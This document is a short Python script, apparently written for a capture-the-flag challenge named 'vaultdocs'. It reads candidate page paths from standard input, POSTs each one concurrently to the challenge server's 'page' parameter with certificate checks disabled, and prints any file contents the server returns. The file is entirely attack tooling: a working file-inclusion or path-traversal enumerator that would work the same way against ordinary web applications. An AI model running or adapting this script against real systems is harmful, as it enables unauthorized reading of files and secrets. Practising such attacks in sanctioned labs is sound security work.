import sys, requests, re, concurrent.futures as cf
requests.packages.urllib3.disable_warnings()
URL="https://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io/"
S=requests.Session(); S.verify=False
VIEW=re.compile(r'<div class="viewer">(.*?)</div>', re.S)
def read(page):
    try:
        r=S.post(URL, data={"page":page}, timeout=15)
        if '<div class="error-box">' in r.text: return (page,None)
        m=VIEW.search(r.text)
        return (page, m.group(1) if m else None)
    except Exception as e:
        return (page, "ERR:"+str(e))
pages=[l.strip() for l in sys.stdin if l.strip()]
with cf.ThreadPoolExecutor(max_workers=6) as ex:
    for page,content in ex.map(read, pages):
        if content is None: continue
        print(">>> FOUND:", page)
        print(content[:4000])
        print("-"*60)
